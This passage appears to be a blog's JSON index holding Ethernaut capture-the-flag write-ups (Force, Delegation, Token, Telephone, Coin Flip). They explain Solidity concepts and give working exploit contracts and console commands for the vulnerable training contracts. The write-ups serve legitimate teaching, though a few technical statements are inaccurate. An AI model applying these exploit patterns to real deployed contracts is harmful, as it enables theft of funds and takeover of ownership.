Layout","url":"/tags/storage-layout/"}],"timestamp":1729625555,"title":"Vault"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Force Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity well. For each challenge, they will deploy the contract and provide us with the instance of that contract. Our task is to interact with the contract and exploit it. Don\u0026rsquo;t worry if you are completely new to Solidity and have never deployed a smart contract. You can learn how to deploy a contract using Remix here. Challenge The goal of this level is to make the balance of the contract greater than zero. Contract Explanation Click to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract Force { /* 5 MEOW ? 6 /\\_/\\ / 7 ____/ o o \\ 8 /~____ =ø= / 9 (______)__m_m) 10 */ } If you understand the contract, you can move to the exploit part. If you are a beginner, please go through the Contract Explanation as well. It will help you understand Solidity better.\nBefore starting with contracts, I would like to explain an inbuilt function named selfdestruct() in Solidity.\nselfdestruct: selfdestruct() is an inbuilt function in Solidity that takes an address parameter as input. When selfdestruct() is executed, it will delete the contract code from Ethereum. If that contract has any ether, it will be sent to the address passed to selfdestruct().\nThe behavior of selfdestruct was changed with the implementation of EIP-6780 in the Dencun upgrade that went live on March 13, 2024. Now it will only send the ether from that contract to the address passed into selfdestruct(). After this change, the contract code will be deleted only if the contract creation and selfdestruct() happen in the same transaction.\nIf we see the contract, we don\u0026rsquo;t have any functions in the contract. It is just an empty contract. We can send ether to a contract only if it has some payable functions or a receive() function. As there are no functions, we cannot send ether directly to the contract.\nExploit As there is no function in the contract, we need to find another method to send ether to the contract.\nThe only way we can send ether to this contract is by creating an exploit contract with a function that executes selfdestruct() and passing the address of the instance contract.\n1function Exploit(address _force) public { 2 selfdestruct(payable(address(_force))); 3} We need to send some ether to the exploit contract so that when we call the Exploit() function, it will send the ether it has to the force contract, increasing the force contract\u0026rsquo;s balance. We can send ether to the exploit contract during deployment itself.\nWhen we use selfdestruct(), it will send ether directly to the address passed as an argument, regardless of whether there is a receive() function or any payable function existing in the address passed to selfdestruct.\nClick to view Exploit contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract ExploitForce { 5 constructor() {} 6 7 function Exploit(address _force) public payable{ 8 selfdestruct(payable(address(_force))); 9 } 10} Once you call the Exploit() function, the challenge will be solved. When calling Exploit(), make sure to send some ether so that the function transfers the ether you sent to the Force contract.\nKey Takeaways Ether Transfer: selfdestruct() can send ether to any address, regardless of whether the target address has a receive() or payable function.\nContract Code Deletion: Post-EIP-6780, the contract code is deleted only if selfdestruct() is called in the same transaction as the contract creation.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/force/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Selfdestruct","url":"/tags/selfdestruct/"}],"timestamp":1729625523,"title":"Force"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Delegation Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity well. For each challenge, they will deploy the contract and provide us with the instance of that contract. Our task is to interact with the contract and exploit it. Don\u0026rsquo;t worry if you are completely new to Solidity and have never deployed a smart contract before. You can learn how to deploy a contract using Remix here. Challenge The goal of this level is for you to claim ownership of the instance you are given. Contract Explanation Click to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract Delegate { 5 address public owner; 6 7 constructor(address _owner) { 8 owner = _owner; 9 } 10 11 function pwn() public { 12 owner = msg.sender; 13 } 14} 15 16contract Delegation { 17 address public owner; 18 Delegate delegate; 19 20 constructor(address _delegateAddress) { 21 delegate = Delegate(_delegateAddress); 22 owner = msg.sender; 23 } 24 25 fallback() external { 26 (bool result,) = address(delegate).delegatecall(msg.data); 27 if (result) { 28 this; 29 } 30 } 31} If you feel like you understand the contract, you can move to the exploit part. If you are a beginner, please go through the Contract Explanation as well. It will help you understand Solidity better.\nBefore getting started with contracts, I would like to explain the different types of calls in solidity. There are mainly three different calls.\nCall Static call Delegate call 1. Call: Call is a low-level function in solidity it is used to call functions in smart contracts. Here is an example of how a call works.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract A{ 5 uint256 public Favourite_Number1=10; 6 uint256 public Favourite_Number2; 7 uint256 public Favoruite_Number3; 8 9 function increment_Favourite_Number1()public { 10 Favourite_Number1++; 11 } 12 13 function set_Favourite_Number2(uint256 _num)public{ 14 Favourite_Number2=_num; 15 } 16 17 function set_Favourite_Number3(uint256 _num)public payable{ 18 require(msg.value \u0026gt;0.0001 ether); 19 Favoruite_Number3=_num; 20 } 21 22} 23 24contract B{ 25 A contract_A=A(0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9); 26 27 function call_increment_Favourite_Number1()public returns (bool){ 28 (bool success,)= address(contract_A).call(abi.encodeWithSignature(\u0026#34;set_Favourite_Number1()\u0026#34;)); 29 require(success,\u0026#34;Call Failed\u0026#34;); 30 return true; 31 } 32 33 function call_set_Favourite_Number2()public returns(bool){ 34 (bool success,)= address(contract_A).call(abi.encodeWithSignature(\u0026#34;set_Favourite_Number2(uint256)\u0026#34;,10)); 35 require(success,\u0026#34;Call Failed\u0026#34;); 36 return true; 37 } 38 39 function call_set_Favourite_Number3()public payable returns(bool){ 40 (bool success,)= address(contract_A).call{value: 0.00012 ether}(abi.encodeWithSignature(\u0026#34;set_Favourite_Number3(uint256)\u0026#34;,11)); 41 require(success,\u0026#34;Call Failed\u0026#34;); 42 return true; 43 } 44} 45 46// Address of contract A: 0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9 47// Address of contract B: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 Here we need to first deploy contract A and then deploy contract B. When you are trying out this don\u0026rsquo;t forget to change the address of contract A which I used in contract B. We will call functions in contract B using a high-level call in remix then contract B calls functions in contract A using the low-level call function.\nCall takes a bytes parameter as input. When we make a low-level call to a contract how it can understand which function to call? We need to pass the function selector as an argument to call to invoke any function in the contract.\nFunction selector is 4-byte data that is used to identify functions uniquely in the contract. The function selector is the hash of the function name and corresponding arguments and its value.\nSolidity has a built-in function abi.encodeWithSignature() that takes two arguments: the name of the function to call and any required arguments. This will return the function selector of the function that passed into abi.encodeWithSignature().\nWhen we call call_increment_Favourite_Number1() in contract B, it will make a low-level call to contract A to invoke increment_Favourite_Number1() and abi.encodeWithSignature() will return the function selector of increment_Favourite_Number1() and this will increment the Favourite_Number1 by 1.\nWhen we call call_set_Favourite_Number2() in contract B, it will make a low-level call to contract A to invoke set_Favourite_Number2(). set_Favourite_Number2() takes an input uint256 as an argument. So in abi.encodeWithSelector() we need to pass the argument of set_Favourite_Number2() as the second argument to abi.encodeWithSelector(). The set_Favourite_Number2() will set the value of Favourite_Number2 to 10 since we passed 10 to abi.encodeWithSelector().\nWhen we call call_set_Favourite_Number3() in contract B, it will make a low-level call to contract A to invoke set_Favourite_Number3(). The set_Favourite_Number3() function has a required statement to be satisfied. In order to make a successful call to set_Favourite_Number3() we need to send ether more than 0.0001. set_Favourite_Number3() takes an input string as an argument. So in abi.encodeWithSelector() we need to pass the argument of set_Favourite_Number3() as the second argument to abi.encodeWithSelector(). Since we are sending ether we need to mention the value of ether we are sending in remix. The set_Favourite_Number3() will set Favourite_Number3 to 11 since we passed 10 to abi.encodeWithSelector().\n2. Static Call: Static call is the same as a call but using a static call we can\u0026rsquo;t make any state changes in the contract. That means when we use staticcall() we cannot change state variables. If we try to do it will revert. staticcall() is used to call functions that return something without changing the state variables of the contract.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract A { 5 uint256 public favouriteNumber = 10; 6 7 function view_Favourite_Number() public view returns (uint256) { 8 return favouriteNumber; 9 } 10 11 function get_Number_Hash(uint256 _num) public pure returns (bytes32) { 12 return keccak256(abi.encodePacked(_num)); 13 } 14} 15 16contract B { 17 A public contract_A; 18 19 constructor(address _contractA) { 20 contract_A = A(_contractA); 21 } 22 23 function call_view_Favourite_Number() public returns (uint256) { 24 (bool success, bytes memory data) = address(contract_A).staticcall(abi.encodeWithSignature(\u0026#34;view_Favourite_Number()\u0026#34;)); 25 require(success, \u0026#34;Call Failed\u0026#34;); 26 uint256 returnData = abi.decode(data, (uint256)); 27 return returnData; 28 } 29 30 function call_get_Number_Hash(uint256 _num) public returns (bytes32) { 31 (bool success, bytes memory data) = address(contract_A).staticcall(abi.encodeWithSignature(\u0026#34;get_Number_Hash(uint256)\u0026#34;, _num)); 32 require(success, \u0026#34;Call Failed\u0026#34;); 33 bytes32 returnData = abi.decode(data, (bytes32)); 34 return returnData; 35 } 36} 37//Address of A:0xeC2eBD42450940039981e5aAE28a67503bEE4927 38//Address of B:0xDab6ba996cd006fc006dF3113893B0D95C4cB44c Here we need to first deploy contract A and then deploy contract B. We will call functions in contract B using a high-level call then contract B calls functions in contract A using a low-level staticcall function.\nWhen we call call_view_Favourite_Number() in contract B, it will make a low-level static call to contract A to invoke view_Favourite_Number(), and abi.encodeWithSignature() will return the function selector, and the function view_Favourite_Number() will return 10 since favouriteNumber was set to 10.\nWhen we call call_get_Number_Hash() in contract B, it will make a low-level static call to contract A to invoke get_Number_Hash(). get_Number_Hash() takes an input uint256 as an argument. So in abi.encodeWithSelector() we need to pass the argument of get_Number_Hash() as the second argument to abi.encodeWithSelector(). The get_Number_Hash() will return a hash of the number passed.\nIn both of the calls call_view_Favourite_Number() and get_Number_Hash() we are not making any changes to state variables. So Static calls will work successfully. Make sure that you try these sample codes in remix ide to understand static calls in a better way. Also, try changing the state variable owner it will be clearer for you.\n3. Delegate Call: A delegatecall is similar to a normal call, but with a key difference: it allows a contract to execute code from another contract while preserving the context (i.e., msg.sender and msg.value). This means that the state variables of the calling contract can be modified by the logic in the called contract. Essentially, the logic execution happens in the called contract, but the state changes occur in the calling contract.\nAssume there are two contracts, contract A and contract B. Suppose contract A makes a delegate call to contract B to invoke a function. The EVM executes the logic of the function in contract B, but if the function makes any changes to state variables, those changes will be made in contract A. If you don\u0026rsquo;t understand don\u0026rsquo;t worry once you see the example it will be clear. The below is an example.\n1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5contract A{ 6 uint256 public favourite_Number; 7 8 function increment_favourite_Number()public returns(address){ 9 favourite_Number++; 10 return msg.sender; 11 } 12 13} 14 15contract B{ 16 uint256 public favourite_Number; 17 A contract_A; 18 constructor(address _addr){ 19 contract_A =A(_addr); 20 } 21 function delegatecall_increment_favourite_Number() public returns(address) { 22 (bool success, bytes memory data) = address(contract_A).delegatecall(abi.encodeWithSignature(\u0026#34;increment_favourite_Number()\u0026#34;)); 23 require(success, \u0026#34;Delegatecall Failed\u0026#34;); 24 address return_data = abi.decode(data, (address)); 25 return return_data; 26 } 27 28 function view_favourite_Number()public view returns (uint256) { 29 return favourite_Number; 30 } 31} Here we need to first deploy contract A and then deploy contract B. We will call functions in contract B using a high-level call in remix then contract B calls functions in contract A using the low-level level delegatecall function.\nWhen we call delegatecall_increment_favourite_Number() in contract B, it will make a low-level delegate call to contract A to invoke increment_favourite_Number(). This function will increment the favourite_Number by 1 and returns msg.sender.\nAs I told earlier favourite_Number wont be changed in contract A it will be changed in contract B. Because only the logic part will happen in contract A but if any state changes are there it will happen in contract B. The function increment_favourite_Number() in contract A is returning msg.sender. In general, it should return the address of contract B. But as it is a delegate call it will return the msg.sender of contract B\u0026rsquo;s function.\nIf it sounds confusing open remix and try it out. Now let\u0026rsquo;s get back to challenge contracts.\nFirst, I will explain the delegate contract.\nThe contract has a single state variable owner which is initialized to the deployer of the contract in the constructor.\n1function pwn() public { 2 owner = msg.sender; 3} The function pwn() is a public function and it sets the replaces the old owner with the msg.sender\nNow I will explain the delegation contract.\nThe delegation has two state variables: owner and delegate . The owner is the one who deployed the Delegation contract and delegate is the instance of Delegate contract. These two variables are initialized in the constructor.\n1fallback() external { 2 (bool result,) = address(delegate).delegatecall(msg.data); 3 if (result) { 4 this; 5 } 6} The contract has a fallback() function which will be executed when someone sends data to a contract that doesn\u0026rsquo;t match any function selector. The fallback function will make a delegatecall to Delegate contract with msg.data which is the data sent to the fallback() function.\nExploit Now it\u0026rsquo;s time to open the console. Open the Delegation challenge and press ctrl+shift+j to open the console.\nEnter the following\n1\u0026gt; contract.abi This will return all the functions of the contract that was given to us. If we see there are two contracts they will give only one contract instance.\nBy looking into abi we can conclude that they have given the instance of a Delegation contract. In the Delegation contract if we look into the fallback function it is making a delegate call to the Delegate contract. If we see the Delegate contract we can find a pwn() function which changes the owner to msg.sender. If the Delegation contract makes a delegatecall to pwn() in the Delegate contract the owner will be changed in the Delegation contract.\nBut if we look into the Delegation contract we can find that the fallback() function is making a delegatecall to the Delegate contract. So somehow we need to call the fallback() function with the function selector of pwn().\nAs I told you earlier fallback() will be triggered when we make a call to a contract with an invalid function selector. Our task is to make a call to the Delegation contract with the function selector as pwn(). As pwn() is not in Delegation it will be an invalid function selector in Delegation and this will trigger the fallback() function and once it is triggered it will make a delegatecall to Delegate contract with msg.data as function selector of pwn().\nEnter the following\n1\u0026gt; const functionSelector = web3.utils.keccak256(\u0026#34;pwn()\u0026#34;).slice(0, 10); 2\u0026gt; await contract.sendTransaction({data: functionSelector}) That\u0026rsquo;s it! Once the transaction is completed, you can submit the instance of this challenge.\nKey Takeaways Delegate Call: delegatecall allows a contract to execute code from another contract while preserving the context (i.e., msg.sender and msg.value). This means that the state variables of the calling contract can be modified by the logic in the called contract. Essentially, the logic execution happens in the called contract, but the state changes occur in the calling contract.\nNote: msg.sender and msg.value won\u0026rsquo;t be changed.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/delegation/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Delegate Call","url":"/tags/delegate-call/"}],"timestamp":1729625456,"title":"Delegation"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Token Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity well. For each challenge, they will deploy the contract and provide us with the instance of that contract. Our task is to interact with the contract and exploit it. Don\u0026rsquo;t worry if you are completely new to Solidity and have never deployed a smart contract before. You can learn how to deploy a contract using Remix here. Challenge The goal of this level is for you to hack the basic token contract below. You are given 20 tokens to start with, and you will beat the level if you somehow manage to get your hands on any additional tokens, preferably a very large amount of tokens. Contract Explanation Click to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.6.0; 3 4contract Token { 5 mapping(address =\u0026gt; uint256) balances; 6 uint256 public totalSupply; 7 8 constructor(uint256 _initialSupply) public { 9 balances[msg.sender] = totalSupply = _initialSupply; 10 } 11 12 function transfer(address _to, uint256 _value) public returns (bool) { 13 require(balances[msg.sender] - _value \u0026gt;= 0); 14 balances[msg.sender] -= _value; 15 balances[_to] += _value; 16 return true; 17 } 18 19 function balanceOf(address _owner) public view returns (uint256 balance) { 20 return balances[_owner]; 21 } 22} If you feel like you understand the contract, you can move to the exploit part. If you are a beginner, please go through the Contract Explanation as well. It will help you understand Solidity better.\nThe contract has two state variables: balances and totalSupply. balances is a mapping of address to tokens, and totalSupply is the total number of tokens available.\n1 constructor(uint256 _initialSupply) public { 2 balances[msg.sender] = totalSupply = _initialSupply; 3 } In the above code snippet, the constructor takes an argument _initialSupply and sets the balances of msg.sender and totalSupply to _initialSupply. 1 function transfer(address _to, uint256 _value) public returns (bool) { 2 require(balances[msg.sender] - _value \u0026gt;= 0); 3 balances[msg.sender] -= _value; 4 balances[_to] += _value; 5 return true; 6 } The function transfer() is a public function that takes two arguments address and amount to transfer as input, and returns true if the transfer is successful.\nFirst, it checks if the balance of msg.sender is more than the value they are transferring. If yes, it will continue executing the next lines; otherwise, it will revert.\nIf the require statement is satisfied, it will reduce the balance of msg.sender and increase the balance of _to, and then return true.\n1 function balanceOf(address _owner) public view returns (uint256 balance) { 2 return balances[_owner]; 3 } The function balanceOf() is a public function that takes an address as input and returns the balance of that address. Exploit The only function in the contract that changes the state of the contract is the transfer() function. So we need to look at the transfer() function for any loops.\nIf we check the solidity compiler version, it is ^0.6.0, which means any version more than 0.6.0 is supported.\nSolidity versions less than 0.8.0 don\u0026rsquo;t implicitly check for overflow and underflow errors. Let me give you a basic example of what overflow and underflow are. Observe the following contract.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.6.0; 3 4contract overflow_underflow{ 5 uint8 overflow=255; 6 uint8 underflow=0; 7 8 function increment()public{ 9 overflow++; 10 } 11 12 function decrement()public{ 13 underflow--; 14 } 15 16} The above contract is a good example to understand overflows and underflows. The state variable overflow is set to 255, and the state variable underflow is set to 0.\nuint8 technically refers to 8 bits, which means it can store a maximum value of 255. If we increase the value of the variable after 255, it will start from zero again. In the above contract, if we call increment() once, then overflow will be set to zero. If we call it again, it will be set to 1, and so on.\nThe minimum value of uint8 is 0. But if we decrease a uint8 variable after zero, it will become 255. In the above contract, if we call decrement() once, then underflow is set to 255. If we call it again, underflow will be set to 254, and so on.\nFor solidity versions greater than 0.8.0, overflow and underflows are implicitly handled. But for solidity versions less than 0.8.0, we need to explicitly handle the overflows and underflows.\nThere is a library named SafeMath to handle overflows and underflows for versions less than 0.8.0.\nInitially, we were given 20 tokens. If we observe, when we transfer, it reduces our balance. If we transfer 20 tokens, we will have 0 tokens. But if we transfer 21 tokens, an underflow will occur, and our balance will be set to 2^255 - 1.\nThe require statement is also passed because balances[msg.sender] will return 20, and we are transferring 21. So again, an underflow will occur, and the value returned will be greater than 0.\nNow it\u0026rsquo;s time to open the console. Open the Token challenge and press ctrl+shift+j to open the console.\n1\u0026gt; await contract.transfer(\u0026#34;0x0000000000000000000000000000000000000000\u0026#34;,21) That\u0026rsquo;s it! Once the transaction is completed, you can submit the instance of this challenge. Key Takeaways For solidity versions less than 0.8.0, we need to explicitly handle the overflows and underflows. We can use the SafeMath library to overcome those. ***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/token/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Overflow","url":"/tags/overflow/"},{"title":"Underflow","url":"/tags/underflow/"},{"title":"ERC20","url":"/tags/erc20/"}],"timestamp":1729625362,"title":"Token"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Telephone Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity well. For each challenge, they will deploy the contract and provide us with the instance of that contract. Our task is to interact with the contract and exploit it. Don\u0026rsquo;t worry if you are completely new to Solidity and have never deployed a smart contract before. You can learn how to deploy a contract using Remix here. Challenge Claim ownership of the contract below to complete this level. Contract Explanation Click to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract Telephone { 5 address public owner; 6 7 constructor() { 8 owner = msg.sender; 9 } 10 11 function changeOwner(address _owner) public { 12 if (tx.origin != msg.sender) { 13 owner = _owner; 14 } 15 } 16} If you feel like you understand the contract, you can move to the exploit part. If you are a beginner, please go through the Contract Explanation as well. It will help you understand Solidity better.\nThe contract has a single state variable called owner, which is initialized during the deployment of the contract.\n1 constructor() { 2 owner = msg.sender; 3 } In the above code snippet, the constructor initializes the owner variable to msg.sender. In the context of the constructor, msg.sender refers to the address of the person deploying the contract. 1 function changeOwner(address _owner) public { 2 if (tx.origin != msg.sender) { 3 owner = _owner; 4 } 5 } The function changeOwner() is a public function that takes an address parameter _owner. _owner is the address of the new proposed owner.\nThe function checks if tx.origin and msg.sender are equal or not. If they are not equal, then the proposed _owner address will become the new owner of the contract.\nNow you might be wondering what tx.origin is. Don\u0026rsquo;t worry, I\u0026rsquo;m here to explain.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract Hi{ 5 address sender; 6 Hello hello=Hello(0xd9145CCE52D386f254917e481eB44e9943F39138); 7 8 function bye()public returns(string memory){ 9 sender=msg.sender; 10 return hello.Goodbye(); 11 } 12 13 function view_sender()public view returns(address){ 14 return sender; 15 } 16 17} 18 19contract Hello{ 20 address origin; 21 function Goodbye()public pure returns (string memory){ 22 origin=tx.origin; 23 return msg.sender; 24 } 25 26 function view_origin()public returns(address){ 27 return origin; 28 } 29} 30 31 32//Address of Hi: 0xf8e81D47203A594245E36C48e151709F0C19fBe8 33//Address of Hello: 0xd9145CCE52D386f254917e481eB44e9943F39138 Let\u0026rsquo;s assume there are two contracts named Hi and Hello. The contract Hi has a function called bye() and Hello has a function called Goodbye().\nWhen we deploy these two contracts and call the bye() function in contract Hi, the following will happen:\nFirst, the sender variable will be updated to msg.sender. Here, msg.sender will be our address since we are calling the bye() function.\nThen, it will call the Goodbye() function in the Hello contract and return the value returned by Goodbye().\nNext, Goodbye() will update the origin variable with tx.origin and then return msg.sender. Since the Hi contract is calling Goodbye() in the Hello contract, the msg.sender will be the address of the Hi contract.\ntx.origin refers to the address that initiated the transaction. In this case, we called the bye() function initially. So, the origin variable in the Hello contract is set to our address, and it returns the address of the Hi contract.\nWhen you are trying out call view_origin() and view_origin() to verify.\nIf you are confused, you can open Remix and try the above example. It will be much clearer.\nIf you are unfamiliar with Remix, you can refer to this video tutorial: Remix Tutorial.\nExploit The only condition we need to satisfy in the changeOwner() function is to make tx.origin not equal to msg.sender.\nSimilar to the previous challenge, if we write an exploit contract and call the changeOwner() function from the exploit contract, then msg.sender will be the address of the exploit contract and tx.origin will be our wallet address.\nClick to view the Exploit contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4import \u0026#34;../src/contracts/Telephone.sol\u0026#34;; 5 6contract ExploitTelephone { 7 Telephone public telephone; 8 9 constructor(address _telephone) { 10 telephone = Telephone(_telephone); 11 } 12 13 function Exploit(address _owner) public { 14 telephone.changeOwner(_owner); 15 } 16} In Remix, during deployment, we need to provide the address of the Telephone contract as an argument to the constructor of the exploit contract.\nDeploy the exploit contract and call the Exploit() function in the ExploitTelephone contract.\nOnce the call is done, submit the challenge instance.\nKey Takeaways The difference between msg.sender and tx.origin is crucial in understanding Ethereum smart contract security: msg.sender: This is the address of the immediate account (either a contract or an external account) that called the current function. tx.origin: This is the address of the original externally owned account that initiated the transaction, regardless of how many contracts were called in between. ***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/telephone/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Msg.sender vs Tx.origin","url":"/tags/msg.sender-vs-tx.origin/"}],"timestamp":1729625321,"title":"Telephone"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for CoinFlip Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity well. For each challenge, they will deploy the contract and provide us with the instance of that contract. Our task is to interact with the contract and exploit it. Don\u0026rsquo;t worry if you are completely new to Solidity and have never deployed a smart contract before. You can learn how to deploy a contract using Remix here. Challenge This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level, you\u0026rsquo;ll need to use your psychic abilities to guess the correct outcome 10 times in a row.\nContract Explanation Click to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract CoinFlip { 5 uint256 public consecutiveWins; 6 uint256 lastHash; 7 uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; 8 9 constructor() { 10 consecutiveWins = 0; 11 } 12 13 function flip(bool _guess) public returns (bool) { 14 uint256 blockValue = uint256(blockhash(block.number - 1)); 15 16 if (lastHash == blockValue) { 17 revert(); 18 } 19 20 lastHash = blockValue; 21 uint256 coinFlip = blockValue / FACTOR; 22 bool side = coinFlip == 1 ? true : false; 23 24 if (side == _guess) { 25 consecutiveWins++; 26 return true; 27 } else { 28 consecutiveWins = 0; 29 return false; 30 } 31 } 32} If you feel like you understood the contract you can move to the exploit part. If you are a begineer please go through contract Explaination also. It will help you to understand the solidity better.\nThe contract has three state variables: uint256 consecutiveWins, uint256 lastHash, and uint256 FACTOR. The consecutiveWins variable will be updated after every successful flip. The lastHash variable will be updated after every flip, and the FACTOR variable is initialized to 57896044618658097711785492504343953926634992332820282019728792003956564819968, which is the maximum value of uint256. It is used to calculate the coinFlip value.\n1constructor() { 2 consecutiveWins = 0; 3} The above code snippet is a constructor that initializes the consecutiveWins variable to zero. The constructor is automatically called during the deployment of the contract. 1function flip(bool _guess) public returns (bool) { 2 uint256 blockValue = uint256(blockhash(block.number - 1)); 3 4 if (lastHash == blockValue) { 5 revert(); 6 } 7 8 lastHash = blockValue; 9 uint256 coinFlip = blockValue / FACTOR; 10 bool side = coinFlip == 1 ? true : false; 11 12 if (side == _guess) { 13 consecutiveWins++; 14 return true; 15 } else { 16 consecutiveWins = 0; 17 return false; 18 } 19} The flip() function is a public function that takes a boolean parameter guess as input and returns true if the flip is successful, otherwise it will return false.\nFirst, it initializes the blockValue to the blockhash of the previous block. They are using the previous blockhash because the blockhash of the current block cannot be determined until it is mined or validated. block.number returns the current block number. By subtracting 1 from the current block number, they get the hash value of the previous block.\nThen, the function checks if the lastHash is equal to blockValue or not. The lastHash is updated after each flip, regardless of success or failure.\nAfter that check, it updates the lastHash value to blockValue. This ensures that flip() can only be called once in a block. If we call flip() with some value and then call it again within the same block, it will revert because the lastHash is already updated to blockValue. Since blockValue is the same in both calls and lastHash will match exactly with the blockValue set in the first call, it will revert.\nNext, the function calculates the coinFlip value by dividing blockValue by FACTOR. FACTOR is a uint256 initialized with 2^255, which is 32 bytes. Since the blockhash is also 32 bytes, when divided by FACTOR, it will return either 0 or 1.\nThen, the function initializes the side variable to true if coinFlip is 1, otherwise it is initialized to false.\nFinally, it checks if the value of side is equal to guess. If they are the same, consecutiveWins is incremented by 1 and the function returns true. If they are not the same, consecutiveWins is set to 0 and the function returns false.\nExploit By examining the contract, it becomes apparent that the value of side is primarily determined by blockValue. If we can somehow obtain the blockValue before calling the function, we can easily calculate the guess value and pass it as an argument to the flip() function.\nWhen interacting with a smart contract, our interactions are conducted through transactions. Calling a function that modifies the state of a deployed contract is considered a transaction. Changing the state involves altering the values of state variables.\nIn the Ethereum Virtual Machine (EVM), if we call a function of a smart contract that in turn calls another contract\u0026rsquo;s function, both calls will be broadcasted to the Ethereum network as a single transaction and will be mined in the same block.\nBased on this understanding, we can conclude that we can calculate the guess value before calling the flip() function and then pass it as an argument to the function.\nIn this challenge, we do not interact with the contract using the console. Instead, we need to write an Exploit contract and deploy and interact with it using Remix, an online Solidity IDE.\nIf you are unfamiliar with Remix, you can refer to this video tutorial: Remix Tutorial.\nHere is an example of an exploit contract:\n1function exploit() public { 2 uint256 blockValue = uint256(blockhash(block.number - 1)); 3 uint256 coinFlip = blockValue / FACTOR; 4 bool guess = coinFlip == 1 ? true : false; 5 bool success = CoinFlip.flip(guess); 6 require(success, \u0026#34;Exploit failed\u0026#34;); 7} As mentioned earlier, we calculate the blockValue and coinFlip values in the same way as the flip() function in the CoinFlip contract.\nOnce the guess value is calculated, we call the flip() function of the CoinFlip contract with the guess value. Since the exploit() function calls the flip() function, both calls will be broadcasted as a single transaction, ensuring that the blockValue remains the same and the flip() function succeeds.\nIf the flip() function fails, our exploit function call will be reverted. However, if our exploit contract is implemented correctly, no reverts will occur.\nTo achieve 10 consecutive wins, we need to call the exploit() function 10 times to pass the level.\nClick to view Exploit contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4import {CoinFlip} from \u0026#34;../src/contracts/CoinFlip.sol\u0026#34;; 5 6contract ExploitCoinFlip { 7CoinFlip coinflip; 8uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; 9 10 constructor(address _addr) { 11 coinflip = CoinFlip(_addr); 12 } 13 14 function exploit() public { 15 uint256 blockValue = uint256(blockhash(block.number - 1)); 16 uint256 coinFlip = blockValue / FACTOR; 17 bool guess = coinFlip == 1 ? true : false; 18 bool a = coinflip.flip(guess); 19 require(a, \u0026#34;Exploit failed\u0026#34;); 20 } 21 22} In Remix, during deployment, we need to provide the address of the CoinFlip contract as an argument to the constructor of the exploit contract.\nOnce the 10 calls are completed, submit the level instance.\nKey Takeaways When interacting with a smart contract, multiple function calls within a single transaction are broadcasted and mined together. This ensures that all changes are applied at once or none at all. This is important for exploiting the CoinFlip contract because it allows us to predict the blockValue and make. ***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/coin-flip/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Predictable Randomness","url":"/tags/predictable-randomness/"},{"title":"Randomness Manipulation","url":"/tags/randomness-manipulation/"}],"timestamp":1729625249,"title":"Coin Flip"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Fallout Hello h4ck3r welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand solidity well.For every challenge they will deploy the contract and give us the instance of that contract and we need to interact with the contract and exploit. Dont worry If you are completely new to solidity and you never deployed smart contract, you can learn deploying the a contract using remix here. challenge In this level the challenge is to become owner of the contract. Contract Explaination Click to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.6.0; 3 4import \u0026#34;openzeppelin-contracts-06/math/SafeMath.sol\u0026#34;; 5 6contract Fallout { 7 using SafeMath for 